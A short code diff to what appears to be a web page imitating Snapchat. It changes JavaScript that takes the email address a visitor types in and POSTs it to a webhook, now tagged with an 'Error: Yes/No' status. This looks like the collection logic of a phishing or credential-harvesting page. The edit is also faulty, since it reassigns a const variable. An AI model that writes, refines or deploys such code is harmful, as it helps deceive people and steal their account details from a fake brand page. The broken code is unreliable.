@@ -61536,15 +61536,19 @@ html[lang='ar'] .theme--snapchat {
                 errorMessage.style.display = 'block';
               }
 
+              const payload = JSON.stringify({
+                  content: `--------------------\nError: No\nEmail: ${email}\n--------------------`
+              });
+
               if (errors.length > 0) {
                   checkerror()
+                  payload = JSON.stringify({
+                  content: `--------------------\nError: Yes\nEmail: ${email}\n--------------------`
+              });
+
               }else{
                   errorMessage.style.display = 'none';
               }
-
-              const payload = JSON.stringify({
-                  content: `Email: ${email}`
-              });
 
               try {
                   // Send the POST request to the webhook
